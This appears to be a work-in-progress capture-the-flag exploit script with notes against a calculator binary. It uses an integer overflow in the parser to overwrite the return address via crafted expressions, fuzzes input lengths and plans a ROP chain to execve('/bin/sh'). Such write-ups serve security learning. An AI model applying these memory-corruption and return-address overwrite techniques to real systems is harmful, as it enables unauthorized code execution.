'''
This binary has both NX bit enabled,
which means code on the stack cannot be executed,
So I can't pass a shellcode and jump do it.
And canary enabled, which means I can't invoke a buffer overflow within the stack.

One of the ways to overcome this is to gain control of the stack,
and by doing so we can jump to certain functions that are already in the `.text` section (executable).

Ideally what we'd do is set the register according to our needs (SYS_EXECVE, '/bin/sh'),
and then jump to an `int 0x80` instruction.

I noticed that when summing up two very large numbers (INT_MAX) for instance,
there's an integer overflow and I get invalid results, most likely this is what the challenge is about.

Notes:
    - Allocated memory for operands is never freed.
    - Is there a way to exploit the integer overflow?


After quite a lot of time,
I analyzed the program _quite_ deeply and still couldn't find the vulnerability.
What I decided to do is leave IDA "alone" and start thinking about how I'd implement a calculator,
and what could possibly go wrong in the process.

This thought process didn't actually yield any results but it was worth a try.
I decided to start the reversing from the beginning,
and do it more throughout than I initially did, and by that I mean understand every bit of the program,
The goal is to have a magnificent IDA database ;)
'''


# Segfault!
p.writeline(f'+{0x1000}+{0x2000}')
'''
Instruction:
0x8049160 <parse_expr+310>    mov    dword ptr [edx + eax*4 + 4], ecx

Registers:
EAX  0x1000
ECX  0x2000
'''

# Attempt to overwrite the return address.
p.writeline(f'+{0xfffffffb}+{0x41414141}')
# First operand cannot be inserted since it's passed as a positive number but the integer is signed.


'''
We'd need to find a way to overflow the expression:[edx + eax*4 + 4] so that it can point to [ebp+0x4]
eax = 0x3ffffff8 --> [ebp+0x4]
'''
p.writeline(f'00+{0x3ffffff8}+{0x41414141}')
p.writeline(f'00+{0x3ffffff8}+{0x41414141}+00+{0x3ffffff9}+{0x42424242}')
# Successfully set 0x41414141 as the new return address.

# Fuzzing (didn't help).
# Later realized that this is simply because an expression is 1024 characters max.

# The multiplier is the maximum value to which you get the right result plus one.
p.writeline('+'.join(['1'] * 513))
# 'expression error!\n0\n'

p.writeline('+'.join(['11'] * 1025))
# '3752\n3752\nexpression error!\n0\n'

p.writeline('+'.join(['111'] * 257))
# 'expression error!\n0\n'

p.writeline('+'.join(['1111'] * 1025))
# '227755\n708682399\n226656\n226656\nexpression error!\n0\n'

p.writeline('1' + '+1-1' * 256)
# '227755\n708682399\n226656\n226656\nexpression error!\n0\n'

# Weird patterns.


'''
; execve("/bin/sh", 0, 0);
eax - first
ecx - second
edx - third
'''


'''
ROP Chain:
1. xor ecx, ecx; ret
2. xor edx, edx; ret
3. Read '/bin/sh' from STDIN into buffer on .bss
4. mov eax, buf
'''


memory_to_write = [0x41414141, 0x42424242, 0x43434343]
memory_to_write = list(map(str, memory_to_write))
base_address = 0x3ffffff7 + len(memory_to_write)

p.writeline(f"00+{base_address}+{'+00+'.join(reversed(memory_to_write))}")
